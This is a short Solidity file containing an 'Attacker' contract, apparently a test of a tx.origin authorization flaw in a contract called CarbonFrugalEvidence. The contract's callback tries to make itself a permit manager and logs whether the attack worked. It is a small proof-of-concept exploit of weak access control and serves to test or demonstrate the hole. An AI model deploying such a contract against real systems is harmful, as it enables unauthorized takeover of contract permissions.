pragma solidity ^0.4.24;
import "hardhat/console.sol";
import "./CarbonFrugalEvidence.sol";

interface IEvidence {
    function changePermitManager(address userAddress, bool permitState)
        public
        returns (uint256);
}

contract Attacker {
    address _evidence;

    constructor(address evidence) {
        _evidence = evidence;
    }

    function callback() public returns (uint256) {
        console.log("msg.sender of Attacker: ", msg.sender);
        uint256 state = IEvidence(_evidence).changePermitManager(
            address(this),
            true
        );
        // test the success of attack using tx.origin
        // state equals to 1 if got attacked
        console.log("state: %s", state);
        if (state == 1) {
            console.log("successful attack.");
        } else {
            console.log("fail to attack.");
        }
        return state;
    }
}
